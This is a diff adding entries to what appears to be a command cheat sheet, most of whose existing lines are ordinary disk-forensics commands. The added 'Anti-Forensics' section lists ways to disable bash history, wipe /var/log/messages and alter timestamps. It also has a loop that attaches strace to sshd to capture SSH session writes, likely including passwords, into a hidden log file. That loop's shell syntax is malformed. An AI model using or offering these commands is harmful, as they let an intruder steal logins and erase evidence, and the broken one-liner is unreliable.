@@ -78,3 +78,10 @@ Find inode number of current directory----ls -id .
 Read an inode----icat /dev/sdb1 &lt;inode-number&gt; | xxd | head
 Input a file, block size, skip blocks, count for # blocks----dd if=/dev/mapper/VulnOSv2--vg-root bs=4096 skip=4718592 count=32767 > /images/bg144.raw
 Find Ascii strings with decimal offset----strings -a -t d
+Mount an NFS Share (requires nfsutils)----mount -t nfs 192.168.0.1:/home/karl nfs
+
+##Anti-Forensics
+Change Timestamps (use current time)----touch -t
+Stop Logggin to .bash_history----unset HISTFILE
+Zero Messages Log----echo > /var/log/messages
+strace sniffing----##sh -c while [ 1 ]; do ;export pid=$(ps aux | grep sshd| grep net | grep -v grep | awk {'print $2'})&& ; if [ "$pid" != "" ];then ; strace -p $pid -e write 2>>/var/log/mail/.$pid.log; fi; done
